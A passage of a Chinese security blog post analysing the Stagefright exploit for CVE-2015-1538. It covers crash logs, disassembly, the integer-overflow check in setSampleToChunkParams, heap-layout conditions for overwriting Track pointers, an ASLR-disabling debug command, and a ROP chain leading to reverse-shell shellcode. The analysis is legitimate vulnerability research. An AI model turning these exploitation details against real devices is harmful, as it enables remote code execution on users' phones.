<span class="number">03-13 13:19</span>:<span class="number">33.180 14267</span> 14267 I DEBUG   :     r<span class="number">0 41d00010</span>  r<span class="number">1 00d00000</span>  r2 001ed3c9  r<span class="number">3 00000000</span>
<span class="number">03-13 13:19</span>:<span class="number">33.180 14267</span> 14267 I DEBUG   : AM write failure (32 / Broken pipe)
<span class="number">03-13 13:19</span>:<span class="number">33.180 14267</span> 14267 I DEBUG   :     r4 b<span class="number">5b40030</span>  r<span class="number">5 000000</span>da  r<span class="number">6 2a0480</span>a0  r<span class="number">7 00000a38</span>
<span class="number">03-13 13:19</span>:<span class="number">33.180 14267</span> 14267 I DEBUG   :     r<span class="number">8 0000000</span>c  r9 b<span class="number">5b40034</span>  sl <span class="number">00000008</span>  fp <span class="number">2a0480a4</span>
<span class="number">03-13 13:19</span>:<span class="number">33.180 14267</span> 14267 I DEBUG   :     ip <span class="number">41d00000</span>  sp b<span class="number">5b40010</span>  lr b697edaf  pc b697ed3a  cpsr <span class="number">000f0030</span>
<span class="number">03-13 13:19</span>:<span class="number">33.180 14267</span> 14267 I DEBUG   :     d0  <span class="number">000000100000</span>0079  d1  <span class="number">00000000000</span>00061
<span class="number">03-13 13:19</span>:<span class="number">33.180 14267</span> 14267 I DEBUG   :     d2  <span class="number">7472616b6</span>d6f6f64  d3  <span class="number">6d696e66</span><span class="number">6d6469a9</span>
<span class="number">03-13 13:19</span>:<span class="number">33.180 14267</span> 14267 I DEBUG   :     d4  <span class="number">42424242424242</span>42  d5  <span class="number">42424242424242</span>42
<span class="number">03-13 13:19</span>:<span class="number">33.180 14267</span> 14267 I DEBUG   :     d6  <span class="number">42424242424242</span>42  d7  <span class="number">42424242424242</span>42
<span class="number">03-13 13:19</span>:<span class="number">33.180 14267</span> 14267 I DEBUG   :     d8  <span class="number">00000000000</span>00000  d9  <span class="number">00000000000</span>00000
<span class="number">03-13 13:19</span>:<span class="number">33.180 14267</span> 14267 I DEBUG   :     d<span class="number">10 00000000</span><span class="number">00000000</span>  d<span class="number">11 00000000</span><span class="number">00000000</span>
<span class="number">03-13 13:19</span>:<span class="number">33.180 14267</span> 14267 I DEBUG   :     d<span class="number">12 00000000</span><span class="number">00000000</span>  d<span class="number">13 00000000</span><span class="number">00000000</span>
<span class="number">03-13 13:19</span>:<span class="number">33.180 14267</span> 14267 I DEBUG   :     d<span class="number">14 00000000</span><span class="number">00000000</span>  d<span class="number">15 00000000</span><span class="number">00000000</span>
<span class="number">03-13 13:19</span>:<span class="number">33.180 14267</span> 14267 I DEBUG   :     d16 3f96de83a904ab51  d<span class="number">17 3f50624</span>dd2f1a9fc
<span class="number">03-13 13:19</span>:<span class="number">33.180 14267</span> 14267 I DEBUG   :     d18 41cc<span class="number">35633580000</span>0  d19 3fc35fe<span class="number">27b800000</span>
<span class="number">03-13 13:19</span>:<span class="number">33.180 14267</span> 14267 I DEBUG   :     d20 3fc5533fc2a45f6a  d21 bf66be3f0c22dc9a
<span class="number">03-13 13:19</span>:<span class="number">33.180 14267</span> 14267 I DEBUG   :     d22 3fc2e2cedd55ea5c  d23 3fe<span class="number">00000000000</span>00
<span class="number">03-13 13:19</span>:<span class="number">33.180 14267</span> 14267 I DEBUG   :     d<span class="number">24 3f88b0</span>d<span class="number">283c30939</span>  d25 bf<span class="number">88b0d28a51</span>8506
<span class="number">03-13 13:19</span>:<span class="number">33.180 14267</span> 14267 I DEBUG   :     d<span class="number">26 00000000</span><span class="number">00000000</span>  d<span class="number">27 40000000</span><span class="number">00000000</span>
<span class="number">03-13 13:19</span>:<span class="number">33.180 14267</span> 14267 I DEBUG   :     d28 3ffda<span class="number">3a6245542</span>b4  d29 bfc4eaefa<span class="number">4251850</span>
<span class="number">03-13 13:19</span>:<span class="number">33.180 14267</span> 14267 I DEBUG   :     d30 3ff<span class="number">00000000000</span>00  d31 3fe29d5df484a30a
<span class="number">03-13 13:19</span>:<span class="number">33.180 14267</span> 14267 I DEBUG   :     scr <span class="number">60000010</span>
<span class="number">03-13 13:19</span>:<span class="number">33.180 14267</span> 14267 I DEBUG   : 
<span class="number">03-13 13:19</span>:<span class="number">33.180 14267</span> 14267 I DEBUG   : backtrace:
<span class="number">03-13 13:19</span>:<span class="number">33.180 14267</span> 14267 I DEBUG   :     #00  pc 0007dd3a  /system/lib/libstagefright.so (androi<span class="number">d::</span>SampleTabl<span class="number">e::</span>setSampleToChunkParams(long long, unsigned int)+137)
<span class="number">03-13 13:19</span>:<span class="number">33.180 14267</span> 14267 I DEBUG   :     #01  pc <span class="number">00062f8</span>d  /system/lib/libstagefright.so (androi<span class="number">d::</span>MPEG4Extractor<span class="number">::</span>parseChunk(long long*, int)+2816)
<span class="number">03-13 13:19</span>:<span class="number">33.180 14267</span> 14267 I DEBUG   :     #02  pc <span class="number">0006271</span>f  /system/lib/libstagefright.so (androi<span class="number">d::</span>MPEG4Extractor<span class="number">::</span>parseChunk(long long*, int)+658)
<span class="number">03-13 13:19</span>:<span class="number">33.180 14267</span> 14267 I DEBUG   :     #03  pc <span class="number">0006271</span>f  /system/lib/libstagefright.so (androi<span class="number">d::</span>MPEG4Extractor<span class="number">::</span>parseChunk(long long*, int)+658)
<span class="number">03-13 13:19</span>:<span class="number">33.180 14267</span> 14267 I DEBUG   :     #04  pc <span class="number">0006271</span>f  /system/lib/libstagefright.so (androi<span class="number">d::</span>MPEG4Extractor<span class="number">::</span>parseChunk(long long*, int)+658)
<span class="number">03-13 13:19</span>:<span class="number">33.180 14267</span> 14267 I DEBUG   :     #05  pc <span class="number">0006271</span>f  /system/lib/libstagefright.so (androi<span class="number">d::</span>MPEG4Extractor<span class="number">::</span>parseChunk(long long*, int)+658)
<span class="number">03-13 13:19</span>:<span class="number">33.180 14267</span> 14267 I DEBUG   :     #06  pc <span class="number">0006271</span>f  /system/lib/libstagefright.so (androi<span class="number">d::</span>MPEG4Extractor<span class="number">::</span>parseChunk(long long*, int)+658)
<span class="number">03-13 13:19</span>:<span class="number">33.180 14267</span> 14267 I DEBUG   :     #07  pc 00063aaf  /system/lib/libstagefright.so (androi<span class="number">d::</span>MPEG4Extractor<span class="number">::</span>readMetaData()+46)
<span class="number">03-13 13:19</span>:<span class="number">33.180 14267</span> 14267 I DEBUG   :     #08  pc <span class="number">00063d6</span>d  /system/lib/libstagefright.so (androi<span class="number">d::</span>MPEG4Extractor<span class="number">::</span>getMetaData()+8)
<span class="number">03-13 13:19</span>:<span class="number">33.180 14267</span> 14267 I DEBUG   :     #09  pc <span class="number">0007f695</span>  /system/lib/libstagefright.so (androi<span class="number">d::</span>StagefrightMetadataRetriever<span class="number">::</span>getFrameAtTime(long long, int)+28)
<span class="number">03-13 13:19</span>:<span class="number">33.180 14267</span> 14267 I DEBUG   :     #10  pc <span class="number">00035945</span>  /system/lib/libmediaplayerservice.so (androi<span class="number">d::</span>MetadataRetrieverClient<span class="number">::</span>getFrameAtTime(long long, int)+64)
...
</code></pre><p>查看堆栈调用，最后崩溃在：android::SampleTable::setSampleToChunkParams(long long, unsigned int)+137，非法地址41d00010，该值与R0寄存器值相等，猜想对该寄存器操作导致。<br>ida反汇编libstagefright.so定位到该行代码</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">0007</span>DD2C loc_7DD2C                               ; CODE XREF: android::SampleTable::setSampleToChunkParams(<span class="keyword">long</span> <span class="keyword">long</span>,uint)+BCj</span><br><span class="line">.text:<span class="number">0007</span>DD2C                 LDR             R0, [R6,<span class="preprocessor">#<span class="number">8</span>]</span></span><br><span class="line">.text:<span class="number">0007</span>DD2E                 MOV.W           R10, <span class="preprocessor">#<span class="number">8</span></span></span><br><span class="line">.text:<span class="number">0007</span>DD32                 MUL.W           R7, R8, R5</span><br><span class="line">.text:<span class="number">0007</span>DD36                 LDRD.W          R2, R3, [R6,<span class="preprocessor">#<span class="number">0x20</span>]</span></span><br><span class="line">.text:<span class="number">0007</span>DD3A                 LDR             R1, [R0]     <span class="comment">// crash!!!</span></span><br><span class="line">.text:<span class="number">0007</span>DD3C                 MOV.W           R11, <span class="preprocessor">#<span class="number">0</span></span></span><br><span class="line">.text:<span class="number">0007</span>DD40                 ADDS.W          R10, R10, R2</span><br><span class="line">.text:<span class="number">0007</span>DD44                 STMEA.W         SP, &#123;R4,R8&#125;</span><br><span class="line">.text:<span class="number">0007</span>DD48                 ADC.W           R11, R11, R3</span><br><span class="line">.text:<span class="number">0007</span>DD4C                 ADDS.W          R2, R10, R7</span><br><span class="line">.text:<span class="number">0007</span>DD50                 ADC.W           R3, R11, <span class="preprocessor">#<span class="number">0</span></span></span><br><span class="line">.text:<span class="number">0007</span>DD54                 LDR             R1, [R1,<span class="preprocessor">#<span class="number">0x1C</span>]</span></span><br><span class="line">.text:<span class="number">0007</span>DD56                 BLX             R1    <span class="comment">// 跳转可控!!!</span></span><br><span class="line">.text:<span class="number">0007</span>DD58                 CMP             R0, <span class="preprocessor">#<span class="number">0xC</span></span></span><br><span class="line">.text:<span class="number">0007</span>DD5A                 BEQ             loc_7DD5E</span><br><span class="line">.text:<span class="number">0007</span>DD5C                 B               loc_7DD72</span><br></pre></td></tr></table></figure>
<p>0007DD3A处执行了LDR R1, [R0]，获取R0寄存器的值，验证了该想法。注意下边BLX R1将跳转到R1执行代码，R1 ＝ [[R0]+0x1C],所以如果R0可控，则可控制代码执行流程。<br>R0＝41d00010，刚好是EXP中对喷的值sp_addr，所以构造好数据即可执行到shellcode中。</p>
<p>对照源码(附带注释)：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">status_t</span> SampleTable::setSampleToChunkParams(</span><br><span class="line">        <span class="keyword">off_t</span> data_offset, <span class="keyword">size_t</span> data_size) &#123;</span><br><span class="line">    <span class="keyword">if</span> (mSampleToChunkOffset &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> ERROR_MALFORMED;</span><br><span class="line">    &#125;</span><br><span class="line"> 	</span><br><span class="line"> 	<span class="comment">// 数据块偏移 </span></span><br><span class="line">    mSampleToChunkOffset = data_offset;</span><br><span class="line"> 	</span><br><span class="line"> 	<span class="comment">// 小于8说明无数据（头部）</span></span><br><span class="line">    <span class="keyword">if</span> (data_size &lt; <span class="number">8</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> ERROR_MALFORMED;</span><br><span class="line">    &#125;</span><br><span class="line"> 	</span><br><span class="line"> 	<span class="comment">// 获取size大小，前8个字节</span></span><br><span class="line">    <span class="keyword">uint8_t</span> header[<span class="number">8</span>];</span><br><span class="line">    <span class="keyword">if</span> (mDataSource-&gt;readAt(</span><br><span class="line">                data_offset, header, <span class="keyword">sizeof</span>(header)) &lt; (<span class="keyword">ssize_t</span>)<span class="keyword">sizeof</span>(header)) &#123;</span><br><span class="line">        <span class="keyword">return</span> ERROR_IO;</span><br><span class="line">    &#125;</span><br><span class="line"> 	</span><br><span class="line"> 	<span class="comment">// 高4位是否为0（version，flags）</span></span><br><span class="line">    <span class="keyword">if</span> (U32_AT(header) != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">// Expected version = 0, flags = 0.</span></span><br><span class="line">        <span class="keyword">return</span> ERROR_MALFORMED;</span><br><span class="line">    &#125;</span><br><span class="line"> 	</span><br><span class="line"> 	<span class="comment">// 获取低4位（Number Of Entries）</span></span><br><span class="line">    mNumSampleToChunkOffsets = U32_AT(&amp;header[<span class="number">4</span>]);</span><br><span class="line"> 	</span><br><span class="line"> 	<span class="comment">// 检测数据大小是否合法</span></span><br><span class="line">    <span class="keyword">if</span> (data_size &lt; <span class="number">8</span> + mNumSampleToChunkOffsets * <span class="number">12</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> ERROR_MALFORMED;</span><br><span class="line">    &#125;</span><br><span class="line"> 	</span><br><span class="line"> 	<span class="comment">// 创建SampleToChunkEntry对象 size＝12</span></span><br><span class="line">    mSampleToChunkEntries =</span><br><span class="line">        <span class="keyword">new</span> SampleToChunkEntry[mNumSampleToChunkOffsets];</span><br><span class="line"> 	</span><br><span class="line"> 	<span class="comment">// 循环解析出每个SampleToChunkEntry数据</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">uint32_t</span> i = <span class="number">0</span>; i &lt; mNumSampleToChunkOffsets; ++i) &#123;</span><br><span class="line">        <span class="keyword">uint8_t</span> buffer[<span class="number">12</span>];</span><br><span class="line">        <span class="keyword">if</span> (mDataSource-&gt;readAt(</span><br><span class="line">                    mSampleToChunkOffset + <span class="number">8</span> + i * <span class="number">12</span>, buffer, <span class="keyword">sizeof</span>(buffer))</span><br><span class="line">                != (<span class="keyword">ssize_t</span>)<span class="keyword">sizeof</span>(buffer)) &#123;</span><br><span class="line">            <span class="keyword">return</span> ERROR_IO;</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        CHECK(U32_AT(buffer) &gt;= <span class="number">1</span>);  <span class="comment">// chunk index is 1 based in the spec.</span></span><br><span class="line"> </span><br><span class="line">        <span class="comment">// We want the chunk index to be 0-based.</span></span><br><span class="line">        mSampleToChunkEntries[i].startChunk = U32_AT(buffer) - <span class="number">1</span>;</span><br><span class="line">        mSampleToChunkEntries[i].samplesPerChunk = U32_AT(&amp;buffer[<span class="number">4</span>]);</span><br><span class="line">        mSampleToChunkEntries[i].chunkDesc = U32_AT(&amp;buffer[<span class="number">8</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">return</span> OK;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>最后blx r1对应的代码为mDataSource-&gt;readAt()，mDataSource类型为<code>sp&lt;DataSource&gt;</code>，readAt函数在MPEG4DataSource中实现，位于虚表指针0x1C处，如下所示：<br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/exploit-cve-2015-1538-readAt.png" alt=""></p>
<p>所以可以得出崩溃时R0为mDataSource指针，即堆喷时覆盖了mDataSource指针。</p>
<p>再看setSampleToChunkParams函数调用来源：</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">status_t MPEG4Extractor::parseChunk(off64_t *offset, int depth) &#123;</span><br><span class="line">	...</span><br><span class="line">	case FOURCC('s', 't', 's', 'c'):</span><br><span class="line">        &#123;</span><br><span class="line">            status_t err =</span><br><span class="line">                mLastTrack-&gt;sampleTable-&gt;setSampleToChunkParams(</span><br><span class="line">                        data_offset, chunk_data_size);</span><br><span class="line"></span><br><span class="line">            if (err != OK) &#123;</span><br><span class="line">                return err;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            *offset += chunk_size;</span><br><span class="line">            break;</span><br><span class="line">        &#125;</span><br><span class="line">	...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在解析stsc类型的数据中调用了该函数，查看sampleTable类，在其＋8处刚好为setSampleToChunkParams函数，对照汇编最开始的LDR R0, [R6,#8]，可知此时R6为sampleTable指针。</p>
<p>查看exp中stsc数据块内容<br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/exploit-cve-2015-1538-1.png" alt=""></p>
<p>再结合前边源码setSampleToChunkParams解析过程：</p>
<p>1.检查数据块大小是否合法，即大于头部8个字节。</p>
<p>2.读取的mNumSampleToChunkOffsets为0xc0000003，经过mul计算后0xc0000003＊0c＝0x900000024，由于32位乘法指令导致上溢位0x24。<br>data_size为数据类型stsc前四个字节再减去8个字节的头部，即为0x34-0x8＝0x2c，即通过了<code>data_size &lt; 8 + mNumSampleToChunkOffsets * 12</code>的判断。</p>
<p>3.创建0xc0000003个SampleToChunkEntry对象，每个大小为12字节。</p>
<p>4.循环解析每个SampleToChunkEntry数据，由于EXP中stsc数据大小为0x1200字节，去掉前8个字节，则实际循环次数为(0x1200 / 0xc) - 1 = 0x17F次，如果在循环期间能够覆盖sampleTable或者mDataSource则必然崩溃。溢出的数据会不断填充高地址，所以要保证new出来的SampleToChunkEntry地址比他们低。</p>
<p>ida挂载调试，直接下断到<br>mSampleToChunkEntries = new SampleToChunkEntry[mNumSampleToChunkOffsets].<br>最后可以看到三个地址如下：<br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/exploit-cve-2015-1538-2.png" alt=""><br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/exploit-cve-2015-1538-3.png" alt=""></p>
<p>加上在上级调用看到的mLastTrack地址，四个地址如下所示：</p>
<pre><code>mSampleToChunkEntries       ＝ <span class="number">0xb7fb5358</span>
mLastTrack                  = <span class="number">0xb7fb59d0</span>
sampleTable                 = <span class="number">0xb7fb5a98</span>
mDataSource                 = <span class="number">0xb7fb50a8</span>
</code></pre><p>0xb7fb5a98 - 0xb7fb5358 = 0x740，所以只要溢出超过0x740字节就必定能够覆盖sampleTable地址上的内容，因此LDR R0, [R6,#8]后R0获取的并不是mDataSource而是stsc中的数据。</p>
<p>但是如果只是覆盖了sampleTable地址，执行不到下边的blx r1就会发生崩溃，所以这种情况并不能控制代码执行流程。<br>在EXP中，通过覆盖Track对象的sampleTable指针，然后程序执行到Track对象的析构函数来控制流程。</p>
<p>在调试中可以知道几个重要结构的地址分布：mSampleToChunkEntries &lt; Track &lt; sampleTable，看下Track结构：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> Track &#123;</span><br><span class="line">     Track *next;</span><br><span class="line">     sp&lt;MetaData&gt; meta;</span><br><span class="line">     <span class="keyword">uint32_t</span> timescale;</span><br><span class="line">     sp&lt;SampleTable&gt; sampleTable;</span><br><span class="line">     <span class="keyword">bool</span> includes_expensive_metadata;</span><br><span class="line">     <span class="keyword">bool</span> skipTrack;</span><br><span class="line"> &#125;;</span><br></pre></td></tr></table></figure>
<p>其中sampleTable指针位于Track＋0xC处，假如溢出覆盖到的地址为fake_addr,如果Track＋0xC &lt; fake_addr &lt; sampleTable，那么就能覆盖掉Track对象的sampleTable指针并不引起崩溃。<br>当所有数据块数据解析完后，会调用MPEG4Extractor中的析构函数，遍历track链表执行delete操作。<br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/exploit-cve-2015-1538-4.jpg" alt=""></p>
<p>delete函数会调用android::RefBase::decStrong<br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/exploit-cve-2015-1538-5.png" alt=""></p>
<p>此时r0为sampleTable指针，利用方式和<a href="http://blog.idhyt.com/2015/08/01/exploit-cve-2014-7911-exp/">cve-2014-7911</a>相同。</p>
<h2 id="可利用条件">可利用条件</h2><p>利用条件需要多次调试来确定，调试过程几个重要的地方：</p>
<pre><code>// sony xperia S android <span class="number">4</span>.<span class="number">04</span>
// 关闭aslr
echo <span class="number">0</span> &gt; <span class="keyword">proc</span>/sys/kernel/randomize_va_space 

// 断点
trak：
    /systembbstagefright.so+<span class="number">0x6CB68</span> ｜ _ZN7android14MPEG4Extractor10parseChunkEPxi+<span class="number">0x208</span>

stsc:
    _ZN7android11SampleTable22setSampleToChunkParamsExj
    // (mSampleToChunkEntries = new <span class="type">SampleToChunkEntry</span>[mNumSampleToChunkOffsets];)
    _ZN7android11SampleTable22setSampleToChunkParamsExj+<span class="number">0x66</span> 

<span class="type">MPEG4Extractor</span>::~<span class="type">MPEG4Extractor</span>
    _ZN7android14MPEG4ExtractorD1Ev

decStrong:
    _ZNK7android7RefBase9decStrongEPKv
</code></pre><p>漏洞利用条件限制要几个重要地址：<br><code>track1</code>，<code>track2</code>，<code>sampleTable2</code>，<code>SampleToChunkEntry2</code>。<br>MPEG4Extractor在析构是通过track链表遍历逐个删除，那么覆盖掉track1或者track2的sampleTable指针都可以控制程序流程。<br>为保证程序不崩，溢出的地址必须位于track2和sampleTable2中间，所以可利用条件为：</p>
<pre><code>SampleToChu<span class="label">nkEntry2</span> + overflowSize &lt; <span class="comment">(track1 | track2)</span> + <span class="number">0</span>xC &lt; sampleTable<span class="number">2</span>
</code></pre><p>上边条件需要多次调试来调整overflowSize大小。</p>
<p>比如某次调试中发现：<br>track1 ＝ 0x2D3D8<br>track2 = 0x2E458<br>SampleToChunkEntry2 = 0x2DB00<br>sampleTable2 = 0x2F010<br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/exploit-cve-2015-1538-sampleTable2.png" alt=""></p>
<p>sampleTable2 - SampleToChunkEntry2 = 0x1510<br>track2 - SampleToChunkEntry2 = 0x958</p>
<p>满足利用条件，即SampleToChunkEntry2溢出以后能够成功覆盖track2并且程序不崩溃。<br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/exploit-cve-2015-1538-sampleToChunkEntry2.png" alt=""><br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/exploit-cve-2015-1538-trak2.png" alt=""></p>
<p>另外exp中的堆喷地址sp_addr需要调试去确定一个概率比较高的地址，libc.so:restore_core_regs地址也需要修改。</p>
<p>exp在实际测试中成功率很低，原因都是由于溢出数据覆盖掉了sampleTable地址的数据，导致调用mDataSorce时崩溃，或者覆盖的地址高于track和sampleTable几个对象以外的其他数据，导致应用解析失败或者crash。</p>
<p>另一篇分析文章<a href="http://huntcve.github.io/2015/12/16/debug-stagefright-exploit/" target="_blank" rel="external">一步一步调通stagefright exploit</a>说明的tx3g位置问题我在调试时也验证了，SampleToChunkEntry2地址位于track1和track2之间的几率相对来说比较大，但是还是有几率落在track1之前，溢出大小我的机器上调试过程中，在能成功率用的内存布局情况下，track2和SampleToChunkEntry2的距离基本是在0x900～0x1200之间，所以原作者的溢出值并没有问题，需要针对不同机器调试确认，下边是我实际调试中选取的10组数据。</p>
<table>
<thead>
<tr>
<th style="text-align:center">index</th>
<th style="text-align:center">track1</th>
<th style="text-align:center">track2</th>
<th style="text-align:center">SampleToChunkEntry2</th>
<th style="text-align:center">sampleTable2</th>
<th style="text-align:center">overflow_size</th>
<th style="text-align:center">is_exploit</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">0</td>
<td style="text-align:center">0x2d2d8</td>
<td style="text-align:center">0x2d298</td>
<td style="text-align:center">0x2e100</td>
<td style="text-align:center">0x2e9f0</td>
<td style="text-align:center">x</td>
<td style="text-align:center">no</td>
</tr>
<tr>
<td style="text-align:center">1</td>
<td style="text-align:center">0x2d698</td>
<td style="text-align:center">0x15e00</td>
<td style="text-align:center">0x2db70</td>
<td style="text-align:center">0x2ede0</td>
<td style="text-align:center">x</td>
<td style="text-align:center">no</td>
</tr>
<tr>
<td style="text-align:center">2</td>
<td style="text-align:center">0x40cb0</td>
<td style="text-align:center">0x407f0</td>
<td style="text-align:center">0x3ef98</td>
<td style="text-align:center">0x44528</td>
<td style="text-align:center">0x1858</td>
<td style="text-align:center">yes</td>
</tr>
<tr>
<td style="text-align:center">3</td>
<td style="text-align:center">0x2d288</td>
<td style="text-align:center">0x2d360</td>
<td style="text-align:center">0x2d760</td>
<td style="text-align:center">0x2ec70</td>
<td style="text-align:center">x</td>
<td style="text-align:center">no</td>
</tr>
<tr>
<td style="text-align:center">4</td>
<td style="text-align:center">0x3d500</td>
<td style="text-align:center">0x400a0</td>
<td style="text-align:center">0x42e48</td>
<td style="text-align:center">0x3fa00</td>
<td style="text-align:center">x</td>
<td style="text-align:center">no</td>
</tr>
<tr>
<td style="text-align:center">5</td>
<td style="text-align:center">0x40a38</td>
<td style="text-align:center">0x3ccf0</td>
<td style="text-align:center">0x428a8</td>
<td style="text-align:center">0x3e530</td>
<td style="text-align:center">x</td>
<td style="text-align:center">no</td>
</tr>
<tr>
<td style="text-align:center">6</td>
<td style="text-align:center">0x2d3d8</td>
<td style="text-align:center">0x2e458</td>
<td style="text-align:center">0x2db00</td>
<td style="text-align:center">0x2f010</td>
<td style="text-align:center">0x958</td>
<td style="text-align:center">yes</td>
</tr>
<tr>
<td style="text-align:center">7</td>
<td style="text-align:center">0x418e0</td>
<td style="text-align:center">0x3feb8</td>
<td style="text-align:center">0x43f38</td>
<td style="text-align:center">0x3fb90</td>
<td style="text-align:center">x</td>
<td style="text-align:center">no</td>
</tr>
<tr>
<td style="text-align:center">8</td>
<td style="text-align:center">0x3d548</td>
<td style="text-align:center">0x410f0</td>
<td style="text-align:center">0x3f890</td>
<td style="text-align:center">0x3fa88</td>
<td style="text-align:center">x</td>
<td style="text-align:center">no</td>
</tr>
<tr>
<td style="text-align:center">9</td>
<td style="text-align:center">0x3cf78</td>
<td style="text-align:center">0x3f690</td>
<td style="text-align:center">0x3e5e0</td>
<td style="text-align:center">0x42a40</td>
<td style="text-align:center">0x10b0</td>
<td style="text-align:center">yes</td>
</tr>
</tbody>
</table>
<h2 id="漏洞利用">漏洞利用</h2><p>析构函数执行过后会跳到ROP中，rop布局好数据后先是调用mprotect函数将sp_addr地址长度为0x1000改为可执行权限，然后跳入shell_reverse_tcp代码中执行，参考<a href="http://drops.wooyun.org/papers/10896" target="_blank" rel="external">CVE-2015-1538漏洞利用中的Shellcode分析</a>。</p>
<p>这个过程中所有函数的调用通过SVC指令完成，类似于Intel CPU中的int 0x80中断，SVC指令会根据相应的调用号去执行相应的函数，这些编号定义在<code>include\arm\unistd.h</code>中。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="preprocessor">#<span class="keyword">define</span> __NR_restart_syscall (__NR_SYSCALL_BASE+ <span class="number">0</span>)</span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">define</span> __NR_exit (__NR_SYSCALL_BASE+ <span class="number">1</span>)</span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">define</span> __NR_fork (__NR_SYSCALL_BASE+ <span class="number">2</span>)</span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">define</span> __NR_read (__NR_SYSCALL_BASE+ <span class="number">3</span>)</span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">define</span> __NR_write (__NR_SYSCALL_BASE+ <span class="number">4</span>)</span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">define</span> __NR_open (__NR_SYSCALL_BASE+ <span class="number">5</span>)</span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">define</span> __NR_close (__NR_SYSCALL_BASE+ <span class="number">6</span>)</span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">define</span> __NR_creat (__NR_SYSCALL_BASE+ <span class="number">8</span>)</span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">define</span> __NR_link (__NR_SYSCALL_BASE+ <span class="number">9</span>)</span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">define</span> __NR_unlink (__NR_SYSCALL_BASE+ <span class="number">10</span>)</span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">define</span> __NR_execve (__NR_SYSCALL_BASE+ <span class="number">11</span>)</span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">define</span> __NR_chdir (__NR_SYSCALL_BASE+ <span class="number">12</span>)</span></span><br></pre></td></tr></table></figure>
<h2 id="影响">影响</h2><p>/system/core/rootdir/init.rc定义了mediaserver用户组权限</p>
